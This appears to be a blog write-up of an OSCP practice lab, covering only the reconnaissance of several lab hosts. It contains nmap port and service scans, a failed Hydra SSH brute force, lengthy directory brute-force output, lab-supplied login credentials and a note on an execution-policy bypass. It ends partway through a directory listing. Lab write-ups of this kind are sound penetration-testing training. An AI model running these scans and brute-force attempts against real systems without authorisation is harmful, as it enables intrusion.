---
title: OSCP A
date: 2026-01-07
draft: false
ShowToc: true
TocOpen: true
tags:
  - blog
  - Web-SourceCode-DataLeak
  - CVE-2021-44087
  - Lateral-Movement-mimikatz
  - Windows-Privilege-Escalation-windows-Files
  - CVE-2020-13151
  - Linux-Privilege-Escalation-link-Injection
  - web-github-abuse
  - Linux-Privilege-Escalation-backupfile
  - Windows-Privilege-Escalation-Putty
lastmod: 2026-02-12T13:44:21.271Z
---
# Box Info

This lab involves a sophisticated attack chain against an Active Directory environment. Learners begin by exploiting a vulnerable webapp to achieve remote code execution, followed by privilege escalation Privilege abuse. Through lateral movement, pivoting across network segments, and cracking Kerberos tickets, learners must enumerate and compromise domain assets to achieve full domain control.

```
10.10.188.140

Challenge 4 - DC01 OS Credentials:

No credentials were provided for this machine

192.168.228.141

Challenge 4 - MS01 OS Credentials:

Eric.Wallows / EricLikesRunning800

10.10.188.142

Challenge 4 - MS02 OS Credentials:

No credentials were provided for this machine

192.168.228.143

Challenge 4 - Aero OS Credentials:

No credentials were provided for this machine

192.168.228.144

Challenge 4 - Crystal OS Credentials:

No credentials were provided for this machine

192.168.228.145

Challenge 4 - Hermes OS Credentials:

No credentials were provided for
```

### Information Gathering/NMAP — Scans

```shell
sudo nmap -iL ip_list --reason -vv -p-  -o openPort.txt
```

```shell
# Nmap 7.95 scan initiated Mon Dec 15 13:43:35 2025 as: /usr/lib/nmap/nmap -iL ip_list --reason -vv -p- -o openPort.txt
Nmap scan report for 192.168.208.141
Host is up, received echo-reply ttl 125 (0.040s latency).
Scanned at 2025-12-15 13:43:35 HKT for 121s
Not shown: 65516 closed tcp ports (reset)
PORT      STATE SERVICE        REASON
22/tcp    open  ssh            syn-ack ttl 125
80/tcp    open  http           syn-ack ttl 125
81/tcp    open  hosts2-ns      syn-ack ttl 125
135/tcp   open  msrpc          syn-ack ttl 125
139/tcp   open  netbios-ssn    syn-ack ttl 125
445/tcp   open  microsoft-ds   syn-ack ttl 125
3306/tcp  open  mysql          syn-ack ttl 125
3307/tcp  open  opsession-prxy syn-ack ttl 125
5040/tcp  open  unknown        syn-ack ttl 125
5985/tcp  open  wsman          syn-ack ttl 125
47001/tcp open  winrm          syn-ack ttl 125
49664/tcp open  unknown        syn-ack ttl 125
49665/tcp open  unknown        syn-ack ttl 125
49666/tcp open  unknown        syn-ack ttl 125
49667/tcp open  unknown        syn-ack ttl 125
49668/tcp open  unknown        syn-ack ttl 125
49669/tcp open  unknown        syn-ack ttl 125
49670/tcp open  unknown        syn-ack ttl 125
51775/tcp open  unknown        syn-ack ttl 125

Nmap scan report for 192.168.208.143
Host is up, received echo-reply ttl 61 (0.039s latency).
Scanned at 2025-12-15 13:43:35 HKT for 146s
Not shown: 65525 filtered tcp ports (no-response)
PORT     STATE SERVICE    REASON
21/tcp   open  ftp        syn-ack ttl 61
22/tcp   open  ssh        syn-ack ttl 61
80/tcp   open  http       syn-ack ttl 61
81/tcp   open  hosts2-ns  syn-ack ttl 61
443/tcp  open  https      syn-ack ttl 61
3000/tcp open  ppp        syn-ack ttl 61
3001/tcp open  nessus     syn-ack ttl 61
3003/tcp open  cgms       syn-ack ttl 61
3306/tcp open  mysql      syn-ack ttl 61
5432/tcp open  postgresql syn-ack ttl 61

Nmap scan report for 192.168.208.144
Host is up, received echo-reply ttl 61 (0.040s latency).
Scanned at 2025-12-15 13:43:35 HKT for 122s
Not shown: 65532 closed tcp ports (reset)
PORT   STATE SERVICE REASON
21/tcp open  ftp     syn-ack ttl 61
22/tcp open  ssh     syn-ack ttl 61
80/tcp open  http    syn-ack ttl 61

Nmap scan report for 192.168.208.145
Host is up, received echo-reply ttl 125 (0.040s latency).
Scanned at 2025-12-15 13:43:35 HKT for 147s
Not shown: 65528 filtered tcp ports (no-response)
PORT     STATE SERVICE       REASON
21/tcp   open  ftp           syn-ack ttl 125
80/tcp   open  http          syn-ack ttl 125
135/tcp  open  msrpc         syn-ack ttl 125
139/tcp  open  netbios-ssn   syn-ack ttl 125
445/tcp  open  microsoft-ds  syn-ack ttl 125
1978/tcp open  unisql        syn-ack ttl 125
3389/tcp open  ms-wbt-server syn-ack ttl 125

Read data files from: /usr/share/nmap
# Nmap done at Mon Dec 15 13:46:02 2025 -- 4 IP addresses (4 hosts up) scanned in 147.25 seconds

```

# Recon 192.168.X.141

### nmap

```shell
└─# sudo nmap -sC -sV -p $(grep -Eo '^[0-9]+/tcp' openPort.txt | cut -d/ -f1 | paste -sd, -) -T4 192.168.208.141 -oN serviceScan.txt

Starting Nmap 7.95 ( https://nmap.org ) at 2025-12-15 14:19 HKT
WARNING: Duplicate port number(s) specified.  Are you alert enough to be using Nmap?  Have some coffee or Jolt(tm).
Nmap scan report for 192.168.208.141
Host is up (0.040s latency).

PORT      STATE  SERVICE       VERSION
21/tcp    closed ftp
22/tcp    open   ssh           OpenSSH for_Windows_8.1 (protocol 2.0)
| ssh-hostkey: 
|   3072 e0:3a:63:4a:07:83:4d:0b:6f:4e:8a:4d:79:3d:6e:4c (RSA)
|   256 3f:16:ca:33:25:fd:a2:e6:bb:f6:b0:04:32:21:21:0b (ECDSA)
|_  256 fe:b0:7a:14:bf:77:84:9a:b3:26:59:8d:ff:7e:92:84 (ED25519)
80/tcp    open   http          Apache httpd 2.4.51 ((Win64) PHP/7.4.26)
|_http-server-header: Apache/2.4.51 (Win64) PHP/7.4.26
| http-methods: 
|_  Potentially risky methods: TRACE
|_http-generator: Nicepage 4.8.2, nicepage.com
|_http-title: Home
81/tcp    open   http          Apache httpd 2.4.51 ((Win64) PHP/7.4.26)
|_http-server-header: Apache/2.4.51 (Win64) PHP/7.4.26
|_http-title: Attendance and Payroll System
| http-cookie-flags: 
|   /: 
|     PHPSESSID: 
|_      httponly flag not set
135/tcp   open   msrpc         Microsoft Windows RPC
139/tcp   open   netbios-ssn   Microsoft Windows netbios-ssn
443/tcp   closed https
445/tcp   open   microsoft-ds?
1978/tcp  closed unisql
3000/tcp  closed ppp
3001/tcp  closed nessus
3003/tcp  closed cgms
3306/tcp  open   mysql         MySQL (unauthorized)
3307/tcp  open   mysql         MariaDB 10.3.24 or later (unauthorized)
3389/tcp  closed ms-wbt-server
5040/tcp  open   unknown
5432/tcp  closed postgresql
5985/tcp  open   http          Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
|_http-server-header: Microsoft-HTTPAPI/2.0
|_http-title: Not Found
47001/tcp open   http          Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
|_http-title: Not Found
|_http-server-header: Microsoft-HTTPAPI/2.0
49664/tcp open   msrpc         Microsoft Windows RPC
49665/tcp open   msrpc         Microsoft Windows RPC
49666/tcp open   msrpc         Microsoft Windows RPC
49667/tcp open   msrpc         Microsoft Windows RPC
49668/tcp open   msrpc         Microsoft Windows RPC
49669/tcp open   msrpc         Microsoft Windows RPC
49670/tcp open   msrpc         Microsoft Windows RPC
51775/tcp open   msrpc         Microsoft Windows RPC
Service Info: OS: Windows; CPE: cpe:/o:microsoft:windows

```

### SSH 22 --Scans

Burte force failed

```
1 of 1 target completed, 0 valid password found
Hydra (https://github.com/vanhauser-thc/thc-hydra) finished at 2025-12-15 13:53:54
```

```
2/tcp open  ssh     OpenSSH for_Windows_8.1 (protocol 2.0)
| ssh-hostkey: 
|   3072 e0:3a:63:4a:07:83:4d:0b:6f:4e:8a:4d:79:3d:6e:4c (RSA)
|   256 3f:16:ca:33:25:fd:a2:e6:bb:f6:b0:04:32:21:21:0b (ECDSA)
|_  256 fe:b0:7a:14:bf:77:84:9a:b3:26:59:8d:ff:7e:92:84 (ED25519)

```

### Web Recon 80

只有program.txt 不過沒有甚麼用\
\#####Default 404 Pages

```
Apache/2.4.51 (Win64) PHP/7.4.26 Server at 192.168.208.141 Port 80
```

\#####WebSite Directory BurteForce

```shell
301      GET        9l       29w      329c http://192.168.208.141/images => http://192.168.208.141/images/
301      GET        9l       29w      327c http://192.168.208.141/blog => http://192.168.208.141/blog/
200      GET       32l      240w    15730c http://192.168.208.141/images/4.png]]
200      GET       28l       69w     3004c http://192.168.208.141/images/7.png]]
200      GET       32l      130w    10021c http://192.168.208.141/images/9.png]]
200      GET       28l       69w     2985c http://192.168.208.141/images/8.png]]
200      GET       11l       83w     5785c http://192.168.208.141/images/82896c5cfbeb3e9d628d685761d5106b.jpeg
200      GET       92l      607w    66833c http://192.168.208.141/images/1.jpeg
200      GET       10l       95w     5460c http://192.168.208.141/images/e55bae5793cb5e5848bd5882209fecba.jpeg
200      GET        6l       46w     2873c http://192.168.208.141/images/11.png]]
200      GET       15l       64w     4334c http://192.168.208.141/images/8dc52c0f711979602e472cb74088d53b.jpeg
200      GET       22l      148w    11627c http://192.168.208.141/images/6.png]]
200      GET       19l       93w     6283c http://192.168.208.141/images/10.png]]
200      GET       25l      148w    12449c http://192.168.208.141/images/5.png]]
200      GET        9l       73w     4740c http://192.168.208.141/images/f9e95c14b7f65aff23628e89fe290e03.jpeg
200      GET       13l       91w     5581c http://192.168.208.141/images/e7176968fc88a5540a57f287ff13ce4e.jpeg
200      GET      114l      942w    57690c http://192.168.208.141/images/ddddddd.jpg
301      GET        9l       29w      329c http://192.168.208.141/Images => http://192.168.208.141/Images/
200      GET       77l      553w    76801c http://192.168.208.141/images/2.jpeg
200      GET      247l     1030w    73110c http://192.168.208.141/images/pretty-smiling-joyfully-female-with-fair-hair-dressed-casually-looking-with-satisfaction_176420-15187.jpg
200      GET     1965l     3441w    32038c http://192.168.208.141/Home.css
200      GET       53l      363w    52008c http://192.168.208.141/images/3.jpeg
200      GET       78l      332w    44713c http://192.168.208.141/blog/post-2.html
200      GET      454l     2311w    36835c http://192.168.208.141/Home.html
200      GET       78l      332w    56085c http://192.168.208.141/blog/post.html
200      GET       78l      332w    62209c http://192.168.208.141/blog/post-4.html
200      GET       78l      332w    62209c http://192.168.208.141/blog/post-1.html
200      GET       78l      332w    56085c http://192.168.208.141/blog/post-3.html
200      GET      163l      657w    53223c http://192.168.208.141/images/happy-man-with-long-thick-ginger-beard-has-friendly-smile_273609-16616.jpg
301      GET        9l       29w      329c http://192.168.208.141/script => http://192.168.208.141/script/
200      GET        2l     1297w    89476c http://192.168.208.141/jquery.js
200      GET      267l     1386w   121071c http://192.168.208.141/images/pexels-photo-3694884.jpeg
200      GET       32l      240w    15730c http://192.168.208.141/Images/4.png]]
200      GET       28l       69w     2985c http://192.168.208.141/Images/8.png]]
200      GET       13l       91w     5581c http://192.168.208.141/Images/e7176968fc88a5540a57f287ff13ce4e.jpeg
200      GET        6l       46w     2873c http://192.168.208.141/Images/11.png]]
200      GET       19l       93w     6283c http://192.168.208.141/Images/10.png]]
200      GET       15l       64w     4334c http://192.168.208.141/Images/8dc52c0f711979602e472cb74088d53b.jpeg
200      GET       28l       69w     3004c http://192.168.208.141/Images/7.png]]
200      GET       10l       95w     5460c http://192.168.208.141/Images/e55bae5793cb5e5848bd5882209fecba.jpeg
200      GET       32l      130w    10021c http://192.168.208.141/Images/9.png]]
200      GET       22l      148w    11627c http://192.168.208.141/Images/6.png]]
200      GET       11l       83w     5785c http://192.168.208.141/Images/82896c5cfbeb3e9d628d685761d5106b.jpeg
200      GET        9l       73w     4740c http://192.168.208.141/Images/f9e95c14b7f65aff23628e89fe290e03.jpeg
200      GET       25l      148w    12449c http://192.168.208.141/Images/5.png]]
200      GET       77l      553w    76801c http://192.168.208.141/Images/2.jpeg
200      GET        9l       31w      262c http://192.168.208.141/script/how%20to%20use%20the%20program.txt
200      GET       78l      332w    44713c http://192.168.208.141/blog/post-5.html
200      GET      371l     1658w    20700c http://192.168.208.141/script/GPO.ps1
200      GET       53l      363w    52008c http://192.168.208.141/Images/3.jpeg
200      GET       92l      607w    66833c http://192.168.208.141/Images/1.jpeg
200      GET      257l     1644w   151247c http://192.168.208.141/images/Untitled-3.jpg
200      GET      454l     2313w    36890c http://192.168.208.141/index
200      GET      381l     2285w   181857c http://192.168.208.141/images/pexels-photo-4316302.jpeg
200      GET       41l     2644w   179436c http://192.168.208.141/nicepage.js
200      GET      295l     1853w   142785c http://192.168.208.141/Images/pexelsphoto3694703.jpeg
200      GET      295l     1853w   142785c http://192.168.208.141/images/pexelsphoto3694703.jpeg
200      GET      102l      836w    98239c http://192.168.208.141/images/default-image.jpg
200      GET      267l     1386w   121071c http://192.168.208.141/Images/pexels-photo-3694884.jpeg
200      GET      438l     2681w   218619c http://192.168.208.141/images/pexelsphoto3694884.jpeg
200      GET      257l     1644w   151247c http://192.168.208.141/Images/Untitled-3.jpg
200      GET      445l     2204w   201165c http://192.168.208.141/images/pexelsphoto3694710.jpeg
200      GET    36435l    78744w  1230366c http://192.168.208.141/nicepage.css
200      GET      454l     2313w    36890c http://192.168.208.141/
200      GET      122l      622w   299314c http://192.168.208.141/blog/blog.html
200      GET      438l     2681w   218619c http://192.168.208.141/Images/pexelsphoto3694884.jpeg
200      GET      102l      836w    98239c http://192.168.208.141/Images/default-image.jpg
200      GET      381l     2285w   181857c http://192.168.208.141/Images/pexels-photo-4316302.jpeg
200      GET     1965l     3441w    32038c http://192.168.208.141/home
200      GET     1965l     3441w    32038c http://192.168.208.141/Home
200      GET        2l     1297w    89476c http://192.168.208.141/jquery
301      GET        9l       29w      327c http://192.168.208.141/Blog => http://192.168.208.141/Blog/
200      GET       78l      332w    44713c http://192.168.208.141/Blog/post-5.html
200      GET       78l      332w    56085c http://192.168.208.141/Blog/post-3.html
200      GET       78l      332w    62209c http://192.168.208.141/Blog/post-1.html
301      GET        9l       29w      329c http://192.168.208.141/SCRIPT => http://192.168.208.141/SCRIPT/
200      GET       78l      332w    62209c http://192.168.208.141/Blog/post-4.html
200      GET       78l      332w    44713c http://192.168.208.141/Blog/post-2.html
200      GET      122l      622w   299314c http://192.168.208.141/Blog/blog.html
200      GET      371l     1658w    20700c http://192.168.208.141/SCRIPT/GPO.ps1
200      GET        9l       31w      262c http://192.168.208.141/SCRIPT/how%20to%20use%20the%20program.txt
200      GET       78l      332w    56085c http://192.168.208.141/Blog/post.html
301      GET        9l       29w      329c http://192.168.208.141/Script => http://192.168.208.141/Script/
200      GET        9l       31w      262c http://192.168.208.141/Script/how%20to%20use%20the%20program.txt
200      GET      371l     1658w    20700c http://192.168.208.141/Script/GPO.ps1
301      GET        9l       29w      329c http://192.168.208.141/IMAGES => http://192.168.208.141/IMAGES/
200      GET       92l      607w    66833c http://192.168.208.141/IMAGES/1.jpeg
200      GET       10l       95w     5460c http://192.168.208.141/IMAGES/e55bae5793cb5e5848bd5882209fecba.jpeg
200      GET      114l      942w    57690c http://192.168.208.141/IMAGES/ddddddd.jpg
200      GET       53l      363w    52008c http://192.168.208.141/IMAGES/3.jpeg
200      GET       25l      148w    12449c http://192.168.208.141/IMAGES/5.png]]
200      GET       32l      130w    10021c http://192.168.208.141/IMAGES/9.png]]
200      GET       11l       83w     5785c http://192.168.208.141/IMAGES/82896c5cfbeb3e9d628d685761d5106b.jpeg
200      GET      247l     1030w    73110c http://192.168.208.141/IMAGES/pretty-smiling-joyfully-female-with-fair-hair-dressed-casually-looking-with-satisfaction_176420-15187.jpg
200      GET      267l     1386w   121071c http://192.168.208.141/IMAGES/pexels-photo-3694884.jpeg
200      GET        6l       46w     2873c http://192.168.208.141/IMAGES/11.png]]
200      GET       28l       69w     2985c http://192.168.208.141/IMAGES/8.png]]
200      GET       28l       69w     3004c http://192.168.208.141/IMAGES/7.png]]
200      GET        9l       73w     4740c http://192.168.208.141/IMAGES/f9e95c14b7f65aff23628e89fe290e03.jpeg
200      GET       13l       91w     5581c http://192.168.208.141/IMAGES/e7176968fc88a5540a57f287ff13ce4e.jpeg
200      GET       15l       64w     4334c http://192.168.208.141/IMAGES/8dc52c0f711979602e472cb74088d53b.jpeg
200      GET       19l       93w     6283c http://192.168.208.141/IMAGES/10.png]]
200      GET       22l      148w    11627c http://192.168.208.141/IMAGES/6.png]]
200      GET       32l      240w    15730c http://192.168.208.141/IMAGES/4.png]]
200      GET       77l      553w    76801c http://192.168.208.141/IMAGES/2.jpeg
200      GET      163l      657w    53223c http://192.168.208.141/IMAGES/happy-man-with-long-thick-ginger-beard-has-friendly-smile_273609-16616.jpg
200      GET      438l     2681w   218619c http://192.168.208.141/IMAGES/pexelsphoto3694884.jpeg
200      GET      295l     1853w   142785c http://192.168.208.141/IMAGES/pexelsphoto3694703.jpeg
200      GET      102l      836w    98239c http://192.168.208.141/IMAGES/default-image.jpg
200      GET      257l     1644w   151247c http://192.168.208.141/IMAGES/Untitled-3.jpg
200      GET      381l     2285w   181857c http://192.168.208.141/IMAGES/pexels-photo-4316302.jpeg
200      GET      445l     2204w   201165c http://192.168.208.141/IMAGES/pexelsphoto3694710.jpeg
200      GET        2l     1297w    89476c http://192.168.208.141/jQuery
200      GET      454l     2313w    36890c http://192.168.208.141/Index
200      GET     1965l     3441w    32038c http://192.168.208.141/HOME
301      GET        9l       29w      327c http://192.168.208.141/BLOG => http://192.168.208.141/BLOG/
200      GET       78l      332w    44713c http://192.168.208.141/BLOG/post-5.html
200      GET       78l      332w    62209c http://192.168.208.141/BLOG/post-1.html
200      GET      122l      622w   299314c http://192.168.208.141/BLOG/blog.html
200      GET        2l     1297w    89476c http://192.168.208.141/JQuery
200      GET       78l      332w    62209c http://192.168.208.141/BLOG/post-4.html
200      GET       78l      332w    44713c http://192.168.208.141/BLOG/post-2.html
200      GET       78l      332w    56085c http://192.168.208.141/BLOG/post.html
200      GET       78l      332w    56085c http://192.168.208.141/BLOG/post-3.html
200      GET        2l     1297w    89476c http://192.168.208.141/Jquery

```

```
http://192.168.208.141/script/how%20to%20use%20the%20program.txt

ExecutionPolicy RemoteSigned -Scope LocalMachine
Set-ExecutionPolicy -Scope Process -ExecutionPolicy Bypass

Then edit where your GPO.ps1 is located and run in power shell
& C:\user location\GPO.ps1
```

### Web Reco 81

{{< toggle "Tag 🏷️" >}}

{{< tag "Web-SourceCode-DataLeak" >}} The website source code leak the page of attendance.php which leak the password

{{< /toggle >}}

![Pasted image 20251215143255.png](/ob/Pasted%20image%2020251215143255.png)\
![Pasted image 20251215144325.png](/ob/Pasted%20image%2020251215144325.png)\
![Pasted image 20251215144402.png](/ob/Pasted%20image%2020251215144402.png)

### WebSite Directory BurteForce

```shell
404      GET        9l       32w      287c Auto-filtering found 404-like response and created new filter; toggle off with --dont-filter
403      GET        9l       29w      290c Auto-filtering found 404-like response and created new filter; toggle off with --dont-filter
301      GET        9l       29w      332c http://192.168.208.141:81/images => http://192.168.208.141:81/images/
301      GET        9l       29w      331c http://192.168.208.141:81/admin => http://192.168.208.141:81/admin/
200      GET        6l       18w      269c http://192.168.208.141:81/scripts
301      GET        9l       29w      333c http://192.168.208.141:81/plugins => http://192.168.208.141:81/plugins/
200      GET        8l       60w      972c http://192.168.208.141:81/attendance.php
200      GET        7l      432w    37045c http://192.168.208.141:81/bower_components/bootstrap/dist/js/bootstrap.min.js
301      GET        9l       29w      331c http://192.168.208.141:81/Admin => http://192.168.208.141:81/Admin/
301      GET        9l       29w      328c http://192.168.208.141:81/db => http://192.168.208.141:81/db/
200      GET       35l      221w    39141c http://192.168.208.141:81/images/profile.jpg
200      GET        4l       66w    31000c http://192.168.208.141:81/bower_components/font-awesome/css/font-awesome.min.css
200      GET        4l     1298w    86659c http://192.168.208.141:81/bower_components/jquery/dist/jquery.min.js
200      GET        7l       56w      323c http://192.168.208.141:81/bower_components/font-awesome/HELP-US-OUT.txt
200      GET      476l     1907w    11197c http://192.168.208.141:81/bower_components/jquery/dist/core.js
200      GET       22l       34w      403c http://192.168.208.141:81/bower_components/font-awesome/bower.json
200      GET       21l      171w     1085c http://192.168.208.141:81/bower_components/bootstrap/LICENSE
200      GET        6l     1429w   121200c http://192.168.208.141:81/bower_components/bootstrap/dist/css/bootstrap.min.css
200      GET        7l     1948w   106344c http://192.168.208.141:81/dist/css/AdminLTE.min.css
200      GET        6l       15w      127c http://192.168.208.141:81/bower_components/bootstrap/Gemfile
200      GET       43l       96w      903c http://192.168.208.141:81/bower_components/bootstrap/Gemfile.lock
200      GET        7l       12w    21778c http://192.168.208.141:81/bower_components/font-awesome/css/font-awesome.css.map
200      GET      511l     1200w    14386c http://192.168.208.141:81/bower_components/bootstrap/Gruntfile.js
200      GET       25l       29w      422c http://192.168.208.141:81/bower_components/moment/bower.json
200      GET     2337l     3940w    37414c http://192.168.208.141:81/bower_components/font-awesome/css/font-awesome.css
200      GET     4463l    14467w   128945c http://192.168.208.141:81/bower_components/moment/moment.js
200      GET      116l      295w     4280c http://192.168.208.141:81/
200      GET        5l       43w      425c http://192.168.208.141:81/bower_components/bootstrap/CHANGELOG.md
200      GET      301l      922w    11218c http://192.168.208.141:81/bower_components/jquery/AUTHORS.txt
200      GET       34l       59w      641c http://192.168.208.141:81/bower_components/bootstrap/bower.json
200      GET       14l       19w      190c http://192.168.208.141:81/bower_components/jquery/bower.json
200      GET      282l      740w     8486c http://192.168.208.141:81/plugins/bootstrap-slider/slider.css
200      GET       22l      169w     1075c http://192.168.208.141:81/bower_components/moment/LICENSE
200      GET       32l       76w      964c http://192.168.208.141:81/bower_components/bootstrap/package.js
200      GET      478l     1497w    14161c http://192.168.208.141:81/plugins/iCheck/icheck.js
200      GET       61l      106w     1568c http://192.168.208.141:81/plugins/iCheck/all.css
200      GET       10l       80w     4516c http://192.168.208.141:81/plugins/iCheck/icheck.min.js
200      GET      712l     2073w    20497c http://192.168.208.141:81/bower_components/moment/moment.d.ts
200      GET      766l     3340w    35103c http://192.168.208.141:81/bower_components/moment/CHANGELOG.md
200      GET      134l      417w     3513c http://192.168.208.141:81/dist/css/skins/skin-green.css
200      GET     1576l     4565w    51062c http://192.168.208.141:81/plugins/bootstrap-slider/bootstrap-slider.js
200      GET       13l       50w      375c http://192.168.208.141:81/bower_components/font-awesome/scss/_larger.scss
200      GET       12l       47w      459c http://192.168.208.141:81/bower_components/font-awesome/scss/_core.scss
200      GET        5l       15w      134c http://192.168.208.141:81/bower_components/font-awesome/scss/_screen-reader.scss
200      GET       60l      161w     1637c http://192.168.208.141:81/bower_components/font-awesome/scss/_mixins.scss
200      GET        6l       15w      120c http://192.168.208.141:81/bower_components/font-awesome/scss/_fixed-width.scss
200      GET       19l       44w      378c http://192.168.208.141:81/bower_components/font-awesome/scss/_list.scss
200      GET        1l      128w     3719c http://192.168.208.141:81/dist/css/skins/skin-green-light.min.css
200      GET       25l       71w      592c http://192.168.208.141:81/bower_components/font-awesome/scss/_bordered-pulled.scss
200      GET       15l       37w      783c http://192.168.208.141:81/bower_components/font-awesome/scss/_path.scss
200      GET       20l       47w      482c http://192.168.208.141:81/bower_components/font-awesome/scss/_stacked.scss
200      GET      163l      500w     4533c http://192.168.208.141:81/dist/css/skins/skin-blue-light.css
200      GET        1l       47w     2732c http://192.168.208.141:81/dist/css/alt/AdminLTE-select2.min.css
200      GET        1l       29w     1469c http://192.168.208.141:81/dist/css/alt/AdminLTE-fullcalendar.min.css
200      GET      760l     1654w    15719c http://192.168.208.141:81/dist/css/alt/AdminLTE-bootstrap-social.css
200      GET        1l     1474w    41583c http://192.168.208.141:81/dist/css/skins/_all-skins.min.css
200      GET        1l      132w     3513c http://192.168.208.141:81/dist/css/skins/skin-black.min.css
200      GET      134l      417w     3560c http://192.168.208.141:81/dist/css/skins/skin-purple.css
200      GET     1127l     2737w    27831c http://192.168.208.141:81/dist/js/adminlte.js
200      GET       20l       88w     6046c http://192.168.208.141:81/dist/img/user4-128x128.jpg
200      GET      349l     1562w    17298c http://192.168.208.141:81/dist/js/demo.js
200      GET     1781l     5532w    48423c http://192.168.208.141:81/dist/css/skins/_all-skins.css
200      GET       47l      265w    24361c http://192.168.208.141:81/dist/img/avatar04.png]]
200      GET        3l        4w      351c http://192.168.208.141:81/dist/img/default-50x50.gif
200      GET        7l       53w     4847c http://192.168.208.141:81/dist/img/user1-128x128.jpg
200      GET       28l      149w    15048c http://192.168.208.141:81/dist/img/avatar2.png]]
200      GET       27l      140w    11392c http://192.168.208.141:81/dist/img/user7-128x128.jpg
200      GET       94l      209w     2284c http://192.168.208.141:81/bower_components/bootstrap/js/alert.js
200      GET      116l      295w     4280c http://192.168.208.141:81/index
200      GET       16l       96w     7493c http://192.168.208.141:81/dist/img/user6-128x128.jpg
200      GET      800l     1613w    22644c http://192.168.208.141:81/bower_components/font-awesome/scss/_variables.scss
200      GET       34l      184w    16798c http://192.168.208.141:81/dist/img/avatar3.png]]
200      GET      162l      483w     4838c http://192.168.208.141:81/bower_components/bootstrap/js/affix.js
200      GET      155l      317w     3905c http://192.168.208.141:81/bower_components/bootstrap/js/tab.js
200      GET       82l      207w     2404c http://192.168.208.141:81/bower_components/moment/src/moment.js
200      GET      172l      439w     4707c http://192.168.208.141:81/bower_components/bootstrap/js/scrollspy.js
200      GET      108l      301w     3163c http://192.168.208.141:81/bower_components/bootstrap/js/popover.js
200      GET      125l      341w     3824c http://192.168.208.141:81/bower_components/bootstrap/js/button.js
200      GET      165l      419w     4743c http://192.168.208.141:81/bower_components/bootstrap/js/dropdown.js
200      GET       56l      115w     1291c http://192.168.208.141:81/bower_components/bootstrap/less/bootstrap.less
200      GET       26l       51w      594c http://192.168.208.141:81/bower_components/bootstrap/less/breadcrumbs.less
200      GET      212l      476w     5991c http://192.168.208.141:81/bower_components/bootstrap/js/collapse.js
200      GET      161l      347w     2987c http://192.168.208.141:81/bower_components/bootstrap/less/scaffolding.less
200      GET      242l      577w     4930c http://192.168.208.141:81/bower_components/bootstrap/less/navs.less
200      GET       69l      163w     1401c http://192.168.208.141:81/bower_components/bootstrap/less/code.less
200      GET      424l     1110w     7559c http://192.168.208.141:81/bower_components/bootstrap/less/normalize.less
200      GET       40l       72w     1136c http://192.168.208.141:81/bower_components/bootstrap/less/mixins.less
200      GET       94l      534w    42816c http://192.168.208.141:81/bower_components/bootstrap/fonts/glyphicons-halflings-regular.woff
200      GET       73l      429w    32536c http://192.168.208.141:81/bower_components/bootstrap/fonts/glyphicons-halflings-regular.woff2
200      GET       60l      242w     1922c http://192.168.208.141:81/bower_components/moment/locale/da.js
200      GET      100l      387w     3966c http://192.168.208.141:81/bower_components/moment/locale/el.js
200      GET      291l      804w     8197c http://192.168.208.141:81/bower_components/bootstrap/less/theme.less
200      GET       62l      135w     1557c http://192.168.208.141:81/plugins/iCheck/polaris/polaris.css
200      GET       80l      336w     2929c http://192.168.208.141:81/bower_components/moment/locale/et.js
200      GET       67l      283w     2185c http://192.168.208.141:81/bower_components/moment/locale/en-gb.js
200      GET       24l      136w    11629c http://192.168.208.141:81/plugins/iCheck/polaris/polaris.png]]
200      GET       97l      389w     3665c http://192.168.208.141:81/bower_components/moment/locale/lv.js
200      GET       58l      221w     2574c http://192.168.208.141:81/bower_components/moment/locale/tzm.js
200      GET      119l      398w     4803c http://192.168.208.141:81/bower_components/moment/locale/bo.js
200      GET       90l      354w     3200c http://192.168.208.141:81/bower_components/moment/locale/mk.js
200      GET        8l       34w     2537c http://192.168.208.141:81/plugins/iCheck/minimal/yellow@2x.png]]
200      GET        8l       41w     2466c http://192.168.208.141:81/plugins/iCheck/minimal/minimal@2x.png]]
200      GET        7l       28w     2063c http://192.168.208.141:81/plugins/iCheck/minimal/red.png]]
200      GET       47l      399w    30342c http://192.168.208.141:81/plugins/iCheck/polaris/polaris@2x.png]]
200      GET        9l       38w     2104c http://192.168.208.141:81/plugins/iCheck/minimal/orange.png]]
200      GET       62l      136w     1626c http://192.168.208.141:81/plugins/iCheck/minimal/aero.css
200      GET        7l       30w     2046c http://192.168.208.141:81/plugins/iCheck/minimal/blue.png]]
200      GET       10l       35w     2009c http://192.168.208.141:81/plugins/iCheck/minimal/purple.png]]
200      GET        9l       33w     2528c http://192.168.208.141:81/plugins/iCheck/minimal/grey@2x.png]]
200      GET       56l      124w     1428c http://192.168.208.141:81/plugins/iCheck/flat/aero.css
200      GET        7l       31w     2046c http://192.168.208.141:81/plugins/iCheck/minimal/grey.png]]
200      GET       56l      124w     1428c http://192.168.208.141:81/plugins/iCheck/flat/grey.css
200      GET       62l      136w     1660c http://192.168.208.141:81/plugins/iCheck/minimal/purple.css
200      GET        6l       31w     2033c http://192.168.208.141:81/plugins/iCheck/minimal/yellow.png]]
200      GET      210l      745w     6064c http://192.168.208.141:81/dist/js/pages/dashboard.js
200      GET       62l      136w     1609c http://192.168.208.141:81/plugins/iCheck/minimal/red.css
200      GET       62l      136w     1626c http://192.168.208.141:81/plugins/iCheck/minimal/pink.css
200      GET        6l       35w     2462c http://192.168.208.141:81/plugins/iCheck/minimal/purple@2x.png]]
200      GET       19l       79w     5743c http://192.168.208.141:81/plugins/iCheck/flat/grey@2x.png]]
200      GET        4l       37w     2620c http://192.168.208.141:81/plugins/iCheck/minimal/red@2x.png]]
200      GET       10l       35w     2048c http://192.168.208.141:81/plugins/iCheck/minimal/green.png]]
200      GET        5l       30w     2022c http://192.168.208.141:81/plugins/iCheck/minimal/aero.png]]
200      GET        5l       39w     2552c http://192.168.208.141:81/plugins/iCheck/minimal/orange@2x.png]]
200      GET       14l       85w     5843c http://192.168.208.141:81/plugins/iCheck/flat/flat@2x.png]]
200      GET       17l      105w     5940c http://192.168.208.141:81/plugins/iCheck/flat/orange@2x.png]]
200      GET       56l      124w     1458c http://192.168.208.141:81/plugins/iCheck/flat/purple.css
200      GET      106l      587w    35387c http://192.168.208.141:81/bower_components/bootstrap/fonts/glyphicons-halflings-regular.eot
200      GET      156l     1018w    78571c http://192.168.208.141:81/dist/img/boxed-bg.png]]
200      GET       56l      123w     1421c http://192.168.208.141:81/plugins/iCheck/futurico/futurico.css
200      GET       14l       76w     5830c http://192.168.208.141:81/plugins/iCheck/flat/blue@2x.png]]
